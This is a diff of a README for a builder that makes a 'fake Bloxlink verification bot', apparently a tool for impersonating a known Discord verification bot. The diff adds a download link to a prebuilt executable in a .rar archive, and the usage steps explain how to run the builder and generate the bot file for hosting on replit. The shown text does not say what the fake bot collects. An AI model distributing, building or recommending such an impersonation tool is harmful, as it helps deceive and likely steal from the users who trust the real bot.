@@ -7,7 +7,7 @@ A Simple Python Builder for the fake Bloxlink verification bot
 
 # Usage
 
-1. Run BloxlinkBuilder.exe OR BloxlinkBuilder.py (If you have python pip install pystyle pip install pyperclip)
+1. Run BloxlinkBuilder.exe (https://github.com/vesperlol/Fake-Bloxlink/releases/download/FakeBloxlink/Bloxlink.rar) OR BloxlinkBuilder.py (If you have python pip install pystyle pip install pyperclip)
 2. Fill the entries
 3. Choose, Copy file (for replit) OR Create file.
 
